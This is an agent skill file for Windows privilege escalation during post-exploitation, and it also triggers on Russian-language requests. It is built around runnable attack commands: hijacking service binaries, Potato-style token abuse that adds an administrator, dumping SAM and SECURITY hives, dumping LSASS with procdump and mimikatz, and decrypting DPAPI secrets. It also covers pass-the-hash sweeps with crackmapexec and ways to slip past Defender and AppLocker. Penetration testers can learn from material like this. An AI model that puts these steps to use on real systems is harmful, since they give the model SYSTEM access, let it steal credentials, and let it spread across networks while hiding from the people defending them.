---
name: pt-privesc-windows
description: Use when a shell or credential on a Windows host must become SYSTEM or Administrator — token privileges, service misconfiguration, unquoted paths, stored credentials, DPAPI, AlwaysInstallElevated, potato techniques, and local AD escalation — including Russian requests (повышение привилегий в Windows, получить SYSTEM, эскалация прав). Use during post-exploitation on Windows endpoints and servers.
version: 1.0.0
author: operator
tags: [offensive, windows, privesc, post-exploitation, system, token]
---

# Windows Privilege Escalation

Windows escalation is a checklist of **specific, verifiable misconfigurations**. Privilege enumeration first, exploitation second. Most real hosts fall to one of: a service ACL, a stored credential, or a token privilege.

## Phase 1: Situational awareness

```cmd
whoami /all
whoami /priv
whoami /groups
systeminfo
wmic qfe list brief              :: patch level
net user; net localgroup administrators; net localgroup "Remote Desktop Users"
cmdkey /list
```

Map every enabled privilege to an exploit path:

| Privilege | Path |
|---|---|
| `SeImpersonatePrivilege` / `SeAssignPrimaryToken` | Potato family (PrintSpoofer, GodPotato, SigmaPotato) |
| `SeBackupPrivilege` | Read `SAM`/`SYSTEM`, `NTDS.dit`; `reg save` |
| `SeRestorePrivilege` | Overwrite protected files, DLL in privileged path |
| `SeDebugPrivilege` | Dump LSASS, inject into SYSTEM process |
| `SeTakeOwnershipPrivilege` | Take ownership of any file/service |
| `SeLoadDriverPrivilege` | Load vulnerable signed driver |
| `SeManageVolumePrivilege` | Write to arbitrary paths via volume handle |

## Phase 2: Automated, then verified by hand

```cmd
winPEASx64.exe quiet cmd fast
powershell -ep bypass -c ". .\PowerUp.ps1; Invoke-AllChecks"
SharpUp.exe audit
```

Every hit must be re-confirmed with the underlying command. `Invoke-AllChecks` gives leads and ready-made abuse commands — read them before running them.

## Phase 3: Services — the most common win

```cmd
:: Unquoted service paths with spaces, running as SYSTEM
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\"

:: Writable service binary or directory, weak service ACL
accesschk.exe -uwcqv "Everyone" * /accepteula
accesschk.exe -uwcqv "Users" *
sc qc <service>
sc config <service> binPath= "C:\temp\shell.exe"     :: requires SERVICE_CHANGE_CONFIG
```

```powershell
# Weak DACL on a service: grant yourself config rights
. .\PowerUp.ps1
Invoke-ServiceAbuse -Name '<svc>' -Command 'net localgroup administrators user /add'
```

Also check: `Modifiable` service registry keys (`HKLM\SYSTEM\CurrentControlSet\Services\*`), writable `ImagePath` directories, DLL search-order hijack in a privileged service's folder.

## Phase 4: Tokens and impersonation

```cmd
:: SeImpersonate -> SYSTEM (IIS app pool, MSSQL, service accounts)
PrintSpoofer64.exe -i -c "cmd /c whoami"
GodPotato.exe -cmd "cmd /c net localgroup administrators user /add"
```

```cmd
:: Incognito / token stealing (meterpreter or SharpToken)
list_tokens -u
impersonate_token "NT AUTHORITY\SYSTEM"
```

## Phase 5: Credentials on disk

```cmd
findstr /si password *.xml *.ini *.txt *.config *.ps1 *.bat
dir /s /b *unattend.xml *sysprep.xml *.kdbx *.rdp *.ovpn
reg query HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU"
type %APPDATA%\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

```powershell
# AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
msiexec /quiet /qn /i C:\temp\evil.msi
```

```cmd
:: Credential stores
vaultcmd /listcreds:"Windows Credentials"
reg save HKLM\SAM sam.hiv & reg save HKLM\SYSTEM sys.hiv & reg save HKLM\SECURITY sec.hiv
:: then offline: impacket-secretsdump -sam sam.hiv -system sys.hiv -security sec.hiv LOCAL
```

Unattended install files, `sysprep.inf`, Group Policy `cpassword` in `SYSVOL`, and browser credential stores are all still common.

## Phase 6: DPAPI and LSASS

```cmd
:: With admin: dump LSASS
procdump64.exe -accepteula -ma lsass.exe C:\temp\lsass.dmp
:: or mimikatz
privilege::debug
sekurlsa::logonpasswords
sekurlsa::tickets /export
```

```cmd
:: DPAPI (user or machine context)
SharpDPAPI.exe machinetriage
SharpDPAPI.exe masterkeys /password:<userpw>
mimikatz # dpapi::cred /in:C:\Users\u\AppData\Local\Microsoft\Credentials\<blob>
```

Non-admin LSASS access requires `SeDebugPrivilege` or a vulnerable driver. Defender catches `procdump` on `lsass` by name — rename or use a custom dumper (see `pt-payload` for OPSEC).

## Phase 7: Local network and AD pivots

```cmd
net view /domain
nltest /dclist:<domain>
:: local admin reuse across hosts (the classic)
crackmapexec / nxc smb <cidr> -u localadmin -H <hash> --local-auth
```

A local admin hash reused on a workstation with a Domain Admin session = domain compromise via token theft, not password cracking.

## Phase 8: AV/EDR awareness

Before running any binary:

```powershell
Get-MpComputerStatus | Select RealTimeProtectionEnabled, AntivirusEnabled
Get-MpPreference | Select ExclusionPath, ExclusionProcess, DisableRealtimeMonitoring
```

Check for AppLocker/WDAC: `Get-AppLockerPolicy -Effective | Test-AppLockerPolicy -Path C:\temp\x.exe -User Everyone`. If blocked, the escalation path must be a script, an LOLBin, or a signed binary proxy — not a dropped exe.

## Recording

`notes\host-<name>.md`:

```markdown
## Host: WS-014 (10.10.1.44) — user: CORP\jsmith
| Vector | Confirmed | Command | Result |
|---|---|---|---|
| SeImpersonatePrivilege | yes | PrintSpoofer64.exe -i -c "cmd /c whoami" | nt authority\system |
| Unquoted path C:\Program Files\Vuln App\svc.exe | no (dir not writable) | — | — |
## Creds
- cmdkey: CORP\svc_backup -> loot/creds/WS-014-svc_backup.md
- LSASS dump -> loot/hashes/WS-014-lsass.txt
```

## Common mistakes

| Mistake | Reality |
|---|---|
| `whoami /priv` read but not mapped | The privilege list is the attack plan |
| Running every PowerUp suggestion blindly | Some change service config — destructive on prod |
| Treating "local admin" as the goal | The goal is what that admin token can reach |
| Dropping obvious binaries into `C:\temp` | Watched path, Defender signature, event log |
| Ignoring `SeBackupPrivilege` | It reads `NTDS.dit` with no exploit at all |
| Forgetting to revert service changes | Broken client service after you leave |
| Missing AppLocker before payload selection | Wrong tool class, wasted hours |
